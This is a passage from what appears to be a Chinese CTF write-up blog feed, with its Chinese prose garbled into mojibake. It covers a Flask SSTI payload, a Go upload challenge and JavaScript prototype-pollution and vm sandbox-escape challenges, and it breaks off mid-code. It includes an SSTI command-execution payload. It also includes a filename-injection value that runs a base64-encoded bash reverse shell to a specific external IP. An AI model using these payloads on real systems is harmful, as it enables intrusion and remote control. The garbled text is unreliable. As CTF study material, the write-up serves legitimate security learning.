:__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())\&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><span class="language-xml">&quot;)</span><br></code></pre></td></tr></table></figure><h2 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h2><p><code>robots.txt</code>ï¼Œä¸‹è½½<code>main-old.zip</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;mime/multipart&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> blacklistChars = []<span class="hljs-type">rune</span>&#123;<span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// è®¾ç½®è·¯ç”±</span><br>http.HandleFunc(<span class="hljs-string">&quot;/gojava&quot;</span>, compileJava)<br><br><span class="hljs-comment">// è®¾ç½®é™æ€æ–‡ä»¶æœåŠ¡å™¨</span><br>fs := http.FileServer(http.Dir(<span class="hljs-string">&quot;.&quot;</span>))<br>http.Handle(<span class="hljs-string">&quot;/&quot;</span>, fs)<br><br><span class="hljs-comment">// å¯åŠ¨æœåŠ¡å™¨</span><br>log.Println(<span class="hljs-string">&quot;Server started on :80&quot;</span>)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isFilenameBlacklisted</span><span class="hljs-params">(filename <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> _, char := <span class="hljs-keyword">range</span> filename &#123;<br><span class="hljs-keyword">for</span> _, blackChar := <span class="hljs-keyword">range</span> blacklistChars &#123;<br><span class="hljs-keyword">if</span> char == blackChar &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">compileJava</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br><span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚æ–¹æ³•æ˜¯å¦ä¸ºPOST</span><br><span class="hljs-keyword">if</span> r.Method != http.MethodPost &#123;<br>http.Error(w, <span class="hljs-string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// è§£æmultipart/form-dataæ ¼å¼çš„è¡¨å•æ•°æ®</span><br>err := r.ParseMultipartForm(<span class="hljs-number">10</span> &lt;&lt; <span class="hljs-number">20</span>) <span class="hljs-comment">// è®¾ç½®æœ€å¤§æ–‡ä»¶å¤§å°ä¸º10MB</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Error parsing form&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// ä»è¡¨å•ä¸­è·å–ä¸Šä¼ çš„æ–‡ä»¶</span><br>file, handler, err := r.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Error retrieving file&quot;</span>, http.StatusBadRequest)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> file.Close()<br><br><span class="hljs-keyword">if</span> isFilenameBlacklisted(handler.Filename) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Invalid filename: contains blacklisted character&quot;</span>, http.StatusBadRequest)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> !strings.HasSuffix(handler.Filename, <span class="hljs-string">&quot;.java&quot;</span>) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Invalid file format, please select a .java file&quot;</span>, http.StatusBadRequest)<br><span class="hljs-keyword">return</span><br>&#125;<br>err = saveFile(file, <span class="hljs-string">&quot;./upload/&quot;</span>+handler.Filename)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Error saving file&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">saveFile</span><span class="hljs-params">(file multipart.File, filePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-comment">// åˆ›å»ºç›®æ ‡æ–‡ä»¶</span><br>f, err := os.Create(filePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> f.Close()<br><br><span class="hljs-comment">// å°†ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶ä¸­</span><br>_, err = io.Copy(f, file)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹ç”¨æˆ·åè¿›è¡Œæ¯”è¾ƒä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè¿™é‡ŒçŒœæµ‹é€šè¿‡ç”¨æˆ·åå®ç°<code>RCE</code>ã€‚(æ„Ÿè§‰çŸ¥è¯†æŒæ¡çš„è¿˜æ˜¯ä¸å¤ªå¥½ï¼Œå½“æ—¶æ²¡æƒ³åˆ°è¿™ä¸ªåˆ©ç”¨ç‚¹ï¼šæ—¢ç„¶ä»–å¯¹ç”¨æˆ·åè¿‡æ»¤äº†è¿™ä¹ˆå¤šï¼Œä»–ä¸ºä»€ä¹ˆè¿™ä¹ˆåšå‘¢ï¼Ÿ)ã€‚åç«¯é€»è¾‘å¯èƒ½ç±»ä¼¼æ‰§è¡Œ<code>javac filename.java</code>è¿™ç§ã€‚</p><p>åå¼¹<code>shell</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1;<span class="hljs-built_in">echo</span> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNTUuMTQuMTM0LzkwMDEgMD4mMSIgfCBiYXNo= | <span class="hljs-built_in">base64</span> -d | bash;1.java<br></code></pre></td></tr></table></figure><p><img src="/img/hnctf6.png" alt="hnctf6"></p><p>æç¤ºflagåœ¨<code>/root</code>ä¸‹ï¼Œ<code>/memorandum</code>ä¸‹å­˜åœ¨å¯†ç ï¼Œ<code>su</code>åˆ‡åˆ°<code>root</code>å†è¾“å…¥å¯†ç å³å¯è¯»å–<code>flag</code>ï¼š</p><p><img src="/img/hnctf7.png" alt="hnctf7"></p><p>å®˜æ–¹<code>wp</code>æ²¡å¼¹<code>shell</code>ï¼š</p><p><a href="https://blog.moran233.xyz/index.php/2024/05/14/83/moran/#GoJava">Gojava</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æœ€è¿‘åšçš„å‡ é“JSé¢˜</title>
    <link href="/2024/04/20/2024-4-20-%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E4%B8%80%E4%BA%9BJS%E9%A2%98/"/>
    <url>/2024/04/20/2024-4-20-%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E4%B8%80%E4%BA%9BJS%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>å‡ é“JSé¢˜</p><span id="more"></span><p><a href="https://xz.aliyun.com/t/10457">å‚è€ƒæ–‡ç« </a></p><h2 id="2024VCTF"><a href="#2024VCTF" class="headerlink" title="2024VCTF"></a>2024VCTF</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// å¼•å…¥Expressæ¡†æ¶å’ŒNode.jsçš„æ–‡ä»¶ç³»ç»Ÿæ¨¡å—ï¼Œä»¥åŠbody-parseråº“ç”¨äºè§£æHTTPè¯·æ±‚ä½“</span><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªExpressåº”ç”¨å®ä¾‹</span><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br><br><span class="hljs-comment">// ä½¿ç”¨body-parserä¸­é—´ä»¶æ¥è§£æURLç¼–ç çš„è¯·æ±‚ä½“ï¼Œå¹¶è®¾ç½®å…¶å¯¹å¤æ‚å¯¹è±¡çš„æ·±åº¦è§£æ</span><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123;<br>    <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span><br>&#125;));<br><br><span class="hljs-comment">// ä½¿ç”¨body-parserä¸­é—´ä»¶æ¥è§£æJSONæ ¼å¼çš„è¯·æ±‚ä½“</span><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå¤„ç†POSTè¯·æ±‚çš„è·¯ç”±ï¼Œå½“è¯·æ±‚å‘é€åˆ°/plzè·¯å¾„æ—¶è§¦å‘</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/plz&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>    <span class="hljs-comment">// ä»è¯·æ±‚ä½“ä¸­æå–venomå¯¹è±¡</span><br>    venom = req.<span class="hljs-property">body</span>.<span class="hljs-property">venom</span><br><br>    <span class="hljs-comment">// æ£€æŸ¥venomå¯¹è±¡çš„å±æ€§ä¸ªæ•°æ˜¯å¦å°‘äº3ï¼Œå¹¶ä¸”welcomeå±æ€§æ˜¯å¦ç­‰äº159753</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(venom).<span class="hljs-property">length</span> &lt; <span class="hljs-number">3</span> &amp;&amp; venom.<span class="hljs-property">welcome</span> == <span class="hljs-number">159753</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// æ£€æŸ¥venomå¯¹è±¡æ˜¯å¦æœ‰textå±æ€§ï¼Œå¦‚æœæœ‰åˆ™è¿”å›textçš„å€¼</span><br>            <span class="hljs-keyword">if</span>(venom.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&quot;text&quot;</span>))&#123;<br>                res.<span class="hljs-title function_">send</span>(venom.<span class="hljs-property">text</span>)<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// å¦‚æœæ²¡æœ‰textå±æ€§ï¼Œåˆ™è¿”å›&quot;no text detected&quot;</span><br>                res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;no text detected&quot;</span>)<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> &#123;<br>            <span class="hljs-comment">// å¦‚æœtryå—ä¸­çš„ä»£ç æŠ›å‡ºå¼‚å¸¸ï¼Œåˆ™æ£€æŸ¥venom.textæ˜¯å¦ç­‰äº&quot;flag&quot;</span><br>            <span class="hljs-keyword">if</span> (venom.<span class="hljs-property">text</span>==<span class="hljs-string">&quot;flag&quot;</span>) &#123;<br>                <span class="hljs-comment">// å¦‚æœæ˜¯ï¼Œåˆ™è¯»å–æ–‡ä»¶ç³»ç»Ÿä¸­çš„&quot;/flag&quot;æ–‡ä»¶ï¼Œå¹¶è¿”å›åŒ…å«æ–‡ä»¶å†…å®¹çš„æ¶ˆæ¯</span><br>                <span class="hljs-keyword">let</span> flag=fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>                res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Congratulations:&quot;</span>+flag);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// å¦‚æœä¸æ˜¯ï¼Œæˆ–è€…tryå—ä¸­çš„ä»£ç æŠ›å‡ºäº†å¼‚å¸¸ï¼Œä½†ä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™è¿”å›&quot;Nothing here!&quot;</span><br>                res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;Nothing here!&quot;</span>)<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// å¦‚æœvenomå¯¹è±¡çš„å±æ€§ä¸ªæ•°ä¸å°‘äº3æˆ–welcomeå±æ€§ä¸ç­‰äº159753ï¼Œåˆ™è¿”å›&quot;happy game&quot;</span><br>        res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;happy game&quot;</span>);<br>    &#125;<br>&#125;)<br><br><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå¤„ç†GETè¯·æ±‚çš„è·¯ç”±ï¼Œå½“è¯·æ±‚å‘é€åˆ°æ ¹è·¯å¾„æ—¶è§¦å‘</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<br><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-comment">// å‘é€ä¸€ä¸ªåŒ…å«HTMLçš„å“åº”ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€ä¸ªè¡¨å•ï¼Œè¯¥è¡¨å•é€šè¿‡POSTè¯·æ±‚å‘é€åˆ°/plzè·¯å¾„</span><br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;&lt;title&gt;oldjs&lt;/title&gt;&lt;a&gt;Hack me plz&lt;/a&gt;&lt;br&gt;&lt;form action=&quot;/plz&quot; method=&quot;POST&quot;&gt;text:&lt;input type=&quot;text&quot; name=&quot;venom[text]&quot; value=&quot;ezjs&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Hack&quot;&gt;&lt;/form&gt;  &#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">// å¯åŠ¨æœåŠ¡å™¨ï¼Œç›‘å¬80ç«¯å£</span><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">80</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`listening at port 80`</span>)<br>&#125;) <br></code></pre></td></tr></table></figure><p>é™åˆ¶äº†venomå¯¹è±¡çš„å±æ€§ä¸ªæ•°å°‘äº3ï¼Œå¹¶ä¸”welcomeå±æ€§æ˜¯å¦ç­‰äº159753ã€‚æƒ³æ‹¿flagè¿˜éœ€venom.text&#x3D;&#x3D;â€flagâ€çš„åŒæ—¶æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚</p><p>å±æ€§ä¸ªæ•°å¯ä»¥åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“ç»•è¿‡ï¼Œæ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•ä»¤venom.hasOwnProperty(â€œtextâ€)æŠ›å‡ºå¼‚å¸¸ï¼š</p><p>venom[hasOwnProperty]&#x3D;Jay17ï¼šè¿™éƒ¨åˆ†å°†venomå¯¹è±¡çš„hasOwnPropertyå±æ€§è®¾ç½®ä¸º1ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼ŒhasOwnPropertyæ˜¯ä¸€ä¸ªç»§æ‰¿è‡ªObject.prototypeçš„æ–¹æ³•ï¼Œç”¨äºæ£€æŸ¥å¯¹è±¡æ˜¯å¦æ‹¥æœ‰ç‰¹å®šçš„è‡ªæœ‰å±æ€§ã€‚é€šè¿‡å°†å®ƒè®¾ç½®ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œvenom.hasOwnProperty(â€œtextâ€)çš„è°ƒç”¨å°†ä¼šå¤±è´¥ï¼Œå› ä¸ºhasOwnPropertyå·²ä¸å†æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚æ‰€ä»¥è¿›å…¥catchå—</p><p>payload:</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">venom<span class="hljs-comment">[__proto__]</span><span class="hljs-comment">[welcome]</span>=159753&amp;venom<span class="hljs-comment">[text]</span>=flag&amp;venom<span class="hljs-comment">[hasOwnProperty]</span>=1<br></code></pre></td></tr></table></figure><h2 id="NKCTF"><a href="#NKCTF" class="headerlink" title="NKCTF"></a>NKCTF</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br>app<br>.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>))<br>.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;/public&#x27;</span>)))<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/home.html&#x27;</span>);<br>&#125;)<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">let</span> pattern = <span class="hljs-regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;<br>    <span class="hljs-keyword">if</span>(code.<span class="hljs-title function_">match</span>(pattern))&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;what can I say? hacker out!!&quot;</span>);<br>    &#125;<br>&#125;<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;<br>        <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span>;<br>        <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title function_">waf</span>(code)<br>            <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>        &#125; <span class="hljs-keyword">catch</span> (e)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">message</span>);<br>            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./hack&#x27;</span>);<br>        &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/secret&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;<br>    <span class="hljs-keyword">if</span>(process.<span class="hljs-property">__filename</span> == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(__filename, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(content);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-property">__filename</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(content);<br>    &#125;<br>&#125;)<br><br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;listen on 3000&quot;</span>);<br>&#125;)<br><br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQLFxfhkCWDAhrD">æ²™ç®±é€ƒé€¸</a></p><p>ç®€å•è¯´å°±æ˜¯è·å–ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ç„¶åè°ƒç”¨<code>constructor</code>å±æ€§è¿›è€Œæ‰§è¡Œå‘½ä»¤ã€‚è¿™é¢˜æ˜¯<code>vm</code>ä¸æ¶‰åŠ<code>vm2</code>æ²™ç®±é€ƒé€¸ã€‚</p><p><code>/</code>è·¯ç”±å­˜åœ¨<code>Runincontext</code>(æ³¨æ„<code>Object.create(null)</code>ï¼Œç›¸å½“äºæ²¡æœ‰thiså…³é”®å­—ã€‚ä½†æ ¹æ®ä¸Šé¢çš„æ–‡ç« æˆ‘ä»¬çŸ¥é“è¿˜å¯ä»¥åˆ©ç”¨<code>arguments.callee.caller</code>è¿”å›æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡)ã€‚å¯ä»¥åœ¨æ²™ç®±ä¸­æ‰§è¡Œç»è¿‡<code>waf</code>æ£€æµ‹åçš„ä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">let</span> pattern = <span class="hljs-regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;<br>    <span class="hljs-keyword">if</span>(code.<span class="hljs-title function_">match</span>(pattern))&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;what can I say? hacker out!!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å¯ä»¥ç”¨æ¥è¿›è¡Œæ¶æ„é‡å†™çš„å‡½æ•°(ç”¨<code>Proxy</code>æ¥åŠ«æŒå±æ€§)</p><p>å…ˆå†™ä¸ªå¦‚æœæ²¡æœ‰wafçš„EXPï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 